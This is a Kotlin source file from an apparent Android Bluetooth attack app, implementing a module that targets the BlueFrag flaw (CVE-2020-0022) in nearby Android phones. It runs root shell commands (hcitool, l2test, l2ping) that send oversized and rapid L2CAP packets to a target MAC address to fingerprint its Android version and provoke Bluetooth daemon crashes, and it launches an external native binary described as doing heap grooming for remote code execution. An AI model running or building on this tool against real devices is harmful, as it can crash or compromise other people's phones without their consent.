package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow

/**
 * Implementation of the BlueFrag attack (CVE-2020-0022).
 *
 * BlueFrag is a critical Android-specific remote code execution vulnerability
 * in the Bluetooth packet reassembly logic (packet_fragmenter.cc). An
 * out-of-bounds write in the L2CAP reassembly buffer allows an attacker to
 * achieve code execution on Android 8 and 9, and a denial-of-service crash
 * on Android 10. The attack requires only the target's Bluetooth MAC address,
 * which is derivable from the WiFi MAC on many devices, giving it worm
 * potential.
 *
 * The module first checks for a dedicated native binary (`bluefrag_scanner`).
 * If that binary is not present, it falls back to L2CAP probing: it creates
 * an ACL connection, reads the remote device name and manufacturer data to
 * estimate the Android version, then sends oversized L2CAP packets via
 * `l2test` to probe fragmentation handling and detect signs of buffer
 * overflow or crash/reset behavior indicative of the vulnerability.
 *
 * Root is required for all approaches (HCI access, raw L2CAP sockets, NDK
 * binary execution). All privileged operations are executed through
 * [RootExecutor].
 */
class BlueFragModule {

    companion object {
        private const val TAG = "BlueFragModule"
        private const val BLUEFRAG_BINARY_PATH = "/data/local/tmp/bluefrag_scanner"

        /**
         * Maximum standard L2CAP payload size for Basic Mode (no segmentation).
         * Packets exceeding this trigger the fragmentation/reassembly path in
         * packet_fragmenter.cc, which is where the CVE-2020-0022 vulnerability
         * resides.
         *
         * Source: Bluetooth Core Specification v5.2, Vol 3, Part A, Section 5.1.
         */
        private const val L2CAP_DEFAULT_MTU = 672

        /**
         * Oversized payload length used to probe the reassembly path. This
         * exceeds L2CAP_DEFAULT_MTU to force the target's packet_fragmenter
         * to reassemble fragments, exercising the vulnerable code path.
         */
        private const val PROBE_PAYLOAD_SIZE = 1024

        /**
         * Android version strings known to be affected by CVE-2020-0022.
         * Android 8.0/8.1 and 9: RCE via out-of-bounds write.
         * Android 10: crash/DoS only (heap layout differences prevent code exec).
         */
        private val VULNERABLE_VERSIONS = listOf("8.0", "8.1", "9", "9.0", "10", "10.0")
    }

    /**
     * Checks if the device has root access via [RootExecutor].
     *
     * @return true if a root shell reports uid=0.
     */
    suspend fun checkRoot(): Boolean {
        return RootExecutor.isRootAvailable()
    }

    /**
     * Executes the BlueFrag vulnerability assessment against the target device.
     *
     * The flow:
     * 1. Validate MAC address
     * 2. Verify root access (required, no simulation fallback)
     * 3. Check if the native bluefrag_scanner binary exists
     * 4. If it exists, run it with the target MAC
     * 5. Otherwise, fall back to L2CAP probing via hcitool and l2test
     *
     * @param targetDevice The Bluetooth device to test.
     * @return A Flow of status strings for the UI console.
     */
    fun startAttack(targetDevice: TargetDevice): Flow<String> = flow {
        val mac = MacValidator.requireValid(targetDevice.macAddress)
        emit("Starting BlueFrag assessment (CVE-2020-0022) on ${targetDevice.name ?: mac}")

        // Root is strictly required -- no simulation fallback
        if (!checkRoot()) {
            emit("ERROR: Root access is not available.")
            emit("BlueFrag requires root for HCI access and raw L2CAP sockets. Aborting.")
            return@flow
        }
        emit("Root access confirmed.")

        // Check if the dedicated native binary exists
        val binaryCheck = RootExecutor.execute("ls $BLUEFRAG_BINARY_PATH")
        val binaryExists = !binaryCheck.startsWith("Error") &&
                !binaryCheck.contains("No such file") &&
                binaryCheck.trim().isNotEmpty()

        if (binaryExists) {
            // Use the native bluefrag_scanner binary
            emit("Native bluefrag_scanner binary found at $BLUEFRAG_BINARY_PATH")
            emit("Executing: $BLUEFRAG_BINARY_PATH -t $mac")

            val output = RootExecutor.execute("$BLUEFRAG_BINARY_PATH -t $mac")
            // Emit each line of output from the binary
            for (line in output.lines()) {
                if (line.isNotBlank()) {
                    emit(line)
                }
            }

            if (output.startsWith("Error")) {
                emit("bluefrag_scanner execution failed.")
            } else {
                emit("bluefrag_scanner execution completed.")
            }
        } else {
            // Fallback: use hcitool + l2test to probe L2CAP fragmentation
            emit("Native binary not found at $BLUEFRAG_BINARY_PATH")
            emit("Falling back to L2CAP fragmentation probing...")

            executeL2capProbing(mac)
        }
    }

    /**
     * Falls back to L2CAP probing when the native binary is not available.
     *
     * The approach:
     * 1. Create an ACL connection via hcitool
     * 2. Read the remote device name and manufacturer data to estimate Android version
     * 3. Send oversized L2CAP packets via l2test to exercise the fragmentation path
     * 4. Monitor for crash/reset behavior indicative of the buffer overflow
     * 5. Emit a vulnerability assessment based on collected evidence
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeL2capProbing(
        mac: String
    ) {
        // Step 1: Create ACL connection
        emit("Creating ACL connection to $mac...")
        val ccResult = RootExecutor.execute("hcitool cc $mac")
        if (ccResult.startsWith("Error")) {
            emit("Failed to create ACL connection: $ccResult")
            emit("The target may be out of range, unpaired, or not accepting connections.")
            return
        }
        emit("ACL connection result: ${ccResult.ifBlank { "OK (no output = success)" }}")

        // Step 2: Read remote device name for version fingerprinting
        emit("Reading remote device name for version fingerprinting...")
        val nameResult = RootExecutor.execute("hcitool name $mac")
        val remoteName = nameResult.trim()

        if (nameResult.startsWith("Error") || remoteName.isBlank()) {
            emit("Could not read remote device name: ${nameResult.ifBlank { "(empty)" }}")
            emit("Continuing without version fingerprint...")
        } else {
            emit("Remote device name: $remoteName")
        }

        // Step 3: Read remote version information via HCI
        emit("Reading remote version information...")
        val infoResult = RootExecutor.execute("hcitool info $mac")
        var detectedVersion: String? = null

        if (infoResult.startsWith("Error") || infoResult.isBlank()) {
            emit("Could not read remote device info: ${infoResult.ifBlank { "(empty)" }}")
        } else {
            for (line in infoResult.lines()) {
                if (line.isNotBlank()) {
                    emit(line)
                }
            }

            // Attempt to extract manufacturer and LMP version for Android fingerprinting
            detectedVersion = fingerPrintAndroidVersion(infoResult, remoteName)
        }

        // Step 4: Read manufacturer data from extended inquiry response
        emit("Querying extended features for additional fingerprinting...")
        val featuresResult = RootExecutor.execute("hcitool cmd 0x04 0x0004")
        if (!featuresResult.startsWith("Error") && featuresResult.isNotBlank()) {
            for (line in featuresResult.lines()) {
                if (line.isNotBlank()) {
                    emit("Extended features: $line")
                }
            }
        }

        // Step 5: Version assessment
        emitVersionAssessment(detectedVersion, mac)

        // Step 6: Probe L2CAP fragmentation behavior
        probeL2capFragmentation(mac)

        // Step 7: Check for crash/reset behavior
        checkTargetStatus(mac)
    }

    /**
     * Attempts to fingerprint the target's Android version from the HCI
     * remote info and device name. Returns the detected version string
     * or null if undetermined.
     *
     * Android devices typically use Qualcomm, Broadcom, or MediaTek
     * Bluetooth chipsets. The LMP subversion and manufacturer ID can
     * narrow the Android version range, and the device name may contain
     * version hints (e.g., "Pixel 3" implies Android 9+).
     */
    private fun fingerPrintAndroidVersion(
        infoResult: String,
        remoteName: String
    ): String? {
        // Check LMP version -- Android 8/9 devices typically report LMP 9 (BT 5.0)
        // or LMP 8 (BT 4.2). Android 10 devices may report LMP 9 or 10.
        val lmpMatch = Regex("LMP Version:\\s*(\\d+\\.\\d+)").find(infoResult)
            ?: Regex("LMP\\s+Version.*?0x(\\d+)").find(infoResult)
        val lmpVersion = lmpMatch?.groupValues?.get(1)

        // Check manufacturer -- Android devices commonly use:
        //   0x000A = Qualcomm, 0x000F = Broadcom, 0x0046 = MediaTek
        val mfgMatch = Regex("Manufacturer:\\s*(\\w+)").find(infoResult)
            ?: Regex("Company.*?0x([0-9a-fA-F]+)").find(infoResult)
        val manufacturer = mfgMatch?.groupValues?.get(1)

        // Heuristic: known Pixel/Samsung/Android device names
        val nameHints = listOf(
            "Pixel" to "9",
            "Nexus" to "8.0",
            "Galaxy S9" to "8.0",
            "Galaxy S10" to "9",
            "Galaxy Note9" to "8.1",
            "Galaxy Note10" to "10"
        )

        for ((pattern, version) in nameHints) {
            if (remoteName.contains(pattern, ignoreCase = true)) {
                return version
            }
        }

        // If we have LMP version info, make a rough estimate
        if (lmpVersion != null || manufacturer != null) {
            return null // Insufficient data for confident version detection
        }

        return null
    }

    /**
     * Emits a vulnerability assessment based on the detected Android version.
     * If the version is undetermined, reports that the assessment is inconclusive.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.emitVersionAssessment(
        detectedVersion: String?,
        mac: String
    ) {
        emit("--- Version Assessment ---")

        if (detectedVersion == null) {
            emit("Could not determine Android version from remote device info.")
            emit("Manual verification recommended. BlueFrag affects Android 8.0-10.")
            emit("Proceeding with L2CAP fragmentation probe regardless...")
            return
        }

        emit("Estimated Android version: $detectedVersion")

        when {
            detectedVersion in listOf("8.0", "8.1", "9", "9.0") -> {
                emit("CRITICAL: Target appears to run Android $detectedVersion.")
                emit("CVE-2020-0022 achieves REMOTE CODE EXECUTION on this version.")
                emit("The out-of-bounds write in packet_fragmenter.cc allows arbitrary " +
                        "code execution via crafted L2CAP fragments.")
                Log.w(TAG, "BlueFrag RCE-vulnerable Android version detected on $mac: $detectedVersion")
            }
            detectedVersion in listOf("10", "10.0") -> {
                emit("WARNING: Target appears to run Android $detectedVersion.")
                emit("CVE-2020-0022 causes a DENIAL OF SERVICE (crash) on this version.")
                emit("Heap layout differences in Android 10 prevent code execution, " +
                        "but the out-of-bounds write still crashes the Bluetooth daemon.")
                Log.w(TAG, "BlueFrag DoS-vulnerable Android version detected on $mac: $detectedVersion")
            }
            else -> {
                emit("Target appears to run Android $detectedVersion.")
                emit("This version is outside the known affected range (8.0-10).")
                emit("The target is likely NOT vulnerable to CVE-2020-0022.")
            }
        }
    }

    /**
     * Probes L2CAP fragmentation behavior by sending oversized packets via
     * `l2test`. The CVE-2020-0022 vulnerability is in the packet reassembly
     * logic: when the target receives L2CAP fragments whose total length
     * exceeds the declared PDU length, the reassembly buffer overflows.
     *
     * This probe:
     * 1. Connects to the target on PSM 1 (SDP) via l2test
     * 2. Sends packets with sizes at and above the default MTU
     * 3. Monitors whether the target handles reassembly correctly or shows
     *    signs of buffer corruption (connection resets, delayed responses)
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.probeL2capFragmentation(
        mac: String
    ) {
        emit("--- L2CAP Fragmentation Probe ---")
        emit("Probing L2CAP reassembly behavior with oversized packets...")

        // Check if l2test is available
        val l2testCheck = RootExecutor.execute("which l2test 2>/dev/null || ls /usr/bin/l2test 2>/dev/null")
        if (l2testCheck.startsWith("Error") || l2testCheck.isBlank()) {
            emit("l2test not found on this device.")
            emit("Install BlueZ tools (l2test) for L2CAP fragmentation probing.")
            emit("Attempting alternative probe via l2ping...")

            // Fallback to l2ping with large payload
            executeL2pingProbe(mac)
            return
        }
        emit("l2test found at: ${l2testCheck.trim()}")

        // Probe 1: Standard MTU connection to establish baseline
        emit("Probe 1: Establishing baseline L2CAP connection (MTU=$L2CAP_DEFAULT_MTU)...")
        val baselineResult = RootExecutor.execute(
            "timeout 5 l2test -b $mac -m $L2CAP_DEFAULT_MTU -P 1 2>&1 || true"
        )
        if (baselineResult.isNotBlank()) {
            for (line in baselineResult.lines()) {
                if (line.isNotBlank()) {
                    emit("Baseline: $line")
                }
            }
        }
        val baselineConnected = !baselineResult.contains("Connection refused") &&
                !baselineResult.contains("Connection timed out")

        if (!baselineConnected) {
            emit("Baseline L2CAP connection failed. Target may not accept L2CAP on PSM 1.")
            emit("Attempting PSM 3 (RFCOMM)...")

            val rfcommResult = RootExecutor.execute(
                "timeout 5 l2test -b $mac -m $L2CAP_DEFAULT_MTU -P 3 2>&1 || true"
            )
            if (rfcommResult.isNotBlank()) {
                for (line in rfcommResult.lines()) {
                    if (line.isNotBlank()) {
                        emit("RFCOMM baseline: $line")
                    }
                }
            }
        }

        // Probe 2: Oversized packet to exercise fragmentation path
        emit("Probe 2: Sending oversized L2CAP packet (size=$PROBE_PAYLOAD_SIZE) to " +
                "exercise fragmentation reassembly...")
        val oversizedResult = RootExecutor.execute(
            "timeout 10 l2test -b $mac -m $PROBE_PAYLOAD_SIZE -P 1 -s 2>&1 || true"
        )
        if (oversizedResult.isNotBlank()) {
            for (line in oversizedResult.lines()) {
                if (line.isNotBlank()) {
                    emit("Oversized: $line")
                }
            }
        }

        // Probe 3: Rapid fragmented packets to stress the reassembly buffer
        emit("Probe 3: Sending rapid fragmented packets to stress reassembly buffer...")
        val stressResult = RootExecutor.execute(
            "timeout 10 l2test -b $mac -m $PROBE_PAYLOAD_SIZE -P 1 -c 5 -s 2>&1 || true"
        )
        if (stressResult.isNotBlank()) {
            for (line in stressResult.lines()) {
                if (line.isNotBlank()) {
                    emit("Stress: $line")
                }
            }
        }

        // Analyze results for signs of vulnerability
        val allOutput = "$baselineResult\n$oversizedResult\n$stressResult"
        analyzeProbeResults(allOutput, mac)
    }

    /**
     * Fallback probe using l2ping with large payload when l2test is not
     * available. l2ping can send echo requests with a specified data size,
     * which still exercises the L2CAP layer and can reveal crash behavior.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeL2pingProbe(
        mac: String
    ) {
        emit("Sending oversized l2ping to probe L2CAP handling...")

        // Send l2ping with payload size exceeding default MTU
        val pingResult = RootExecutor.execute(
            "timeout 10 l2ping -s $PROBE_PAYLOAD_SIZE -c 3 $mac 2>&1 || true"
        )

        if (pingResult.startsWith("Error") || pingResult.isBlank()) {
            emit("l2ping probe failed: ${pingResult.ifBlank { "(no output)" }}")
            emit("Neither l2test nor l2ping available for L2CAP probing.")
            emit("Install BlueZ tools for complete vulnerability assessment.")
            return
        }

        for (line in pingResult.lines()) {
            if (line.isNotBlank()) {
                emit("l2ping: $line")
            }
        }

        // Check if the target stopped responding (possible crash)
        val responseCount = Regex("bytes from").findAll(pingResult).count()
        emit("Received $responseCount/3 l2ping responses.")

        when {
            responseCount == 0 -> {
                emit("WARNING: Target did not respond to any l2ping echo requests.")
                emit("This may indicate a crash in the L2CAP layer (potential BlueFrag).")
            }
            responseCount < 3 -> {
                emit("WARNING: Target stopped responding during l2ping sequence.")
                emit("Partial response loss may indicate instability in packet reassembly.")
            }
            else -> {
                emit("Target responded to all l2ping requests. Baseline L2CAP handling appears stable.")
            }
        }
    }

    /**
     * Analyzes the combined output from L2CAP probes for signs of the
     * BlueFrag vulnerability: connection resets, timeouts after oversized
     * packets, or error patterns consistent with buffer corruption.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.analyzeProbeResults(
        output: String,
        mac: String
    ) {
        emit("--- Probe Analysis ---")

        val connectionReset = output.contains("Connection reset", ignoreCase = true)
        val brokenPipe = output.contains("Broken pipe", ignoreCase = true)
        val segfault = output.contains("Segmentation fault", ignoreCase = true) ||
                output.contains("SIGSEGV", ignoreCase = true)
        val timeout = output.contains("timed out", ignoreCase = true)
        val refused = output.contains("Connection refused", ignoreCase = true)

        when {
            segfault -> {
                emit("CRITICAL: Segmentation fault detected in target response.")
                emit("This strongly indicates a buffer overflow in packet_fragmenter.cc.")
                emit("The target is likely VULNERABLE to CVE-2020-0022 (BlueFrag).")
                Log.w(TAG, "BlueFrag: segfault indicator detected on $mac")
            }
            connectionReset && !refused -> {
                emit("WARNING: Connection reset after oversized L2CAP packet.")
                emit("The target's Bluetooth daemon may have crashed and restarted.")
                emit("This behavior is consistent with CVE-2020-0022 exploitation.")
                emit("Further testing with the native binary is recommended for confirmation.")
                Log.w(TAG, "BlueFrag: connection reset after oversized packet on $mac")
            }
            brokenPipe -> {
                emit("WARNING: Broken pipe during L2CAP communication.")
                emit("The target dropped the connection unexpectedly after receiving " +
                        "oversized fragments. This may indicate a crash in reassembly.")
                Log.w(TAG, "BlueFrag: broken pipe indicator on $mac")
            }
            timeout -> {
                emit("Target timed out during L2CAP probing.")
                emit("The target may have crashed or become unresponsive. If the target's " +
                        "Bluetooth restarted, this is consistent with BlueFrag behavior.")
                emit("Check if the target device's Bluetooth is still active.")
            }
            refused -> {
                emit("Target refused L2CAP connections.")
                emit("Cannot probe fragmentation behavior without an L2CAP connection.")
                emit("The target may have L2CAP PSM restrictions or may require pairing first.")
            }
            else -> {
                emit("No crash or reset indicators detected during L2CAP probing.")
                emit("The target handled oversized packets without visible instability.")
                emit("This does not conclusively rule out vulnerability -- the specific " +
                        "heap layout required for exploitation may not have been triggered.")
                emit("For definitive testing, use the native bluefrag_scanner binary.")
            }
        }
    }

    /**
     * Checks whether the target is still reachable after probing. If the
     * target's Bluetooth daemon crashed due to the buffer overflow, it may
     * have restarted (with a brief period of unavailability) or may still
     * be down.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.checkTargetStatus(
        mac: String
    ) {
        emit("--- Post-Probe Target Status ---")
        emit("Checking if target is still reachable...")

        val pingResult = RootExecutor.execute("timeout 5 l2ping -c 1 $mac 2>&1 || true")

        when {
            pingResult.contains("bytes from") -> {
                emit("Target is still reachable. Bluetooth daemon is running.")
                emit("No crash detected from probing (or daemon has restarted).")
            }
            pingResult.contains("timed out", ignoreCase = true) ||
            pingResult.contains("Host is down", ignoreCase = true) -> {
                emit("WARNING: Target is no longer reachable.")
                emit("The target's Bluetooth daemon may have crashed during probing.")
                emit("This is a strong indicator of CVE-2020-0022 vulnerability.")
                emit("The daemon typically restarts after a few seconds on Android.")
                Log.w(TAG, "BlueFrag: target $mac unreachable after probing (possible crash)")
            }
            else -> {
                emit("Target status check result: ${pingResult.ifBlank { "(no output)" }}")
                emit("Unable to determine target status conclusively.")
            }
        }

        emit("--- BlueFrag Assessment Complete ---")
        emit("For full exploitation testing, deploy the native bluefrag_scanner binary to:")
        emit("  $BLUEFRAG_BINARY_PATH")
        emit("The native binary performs precise heap grooming and controlled " +
                "out-of-bounds writes required for reliable RCE on Android 8/9.")
    }
}
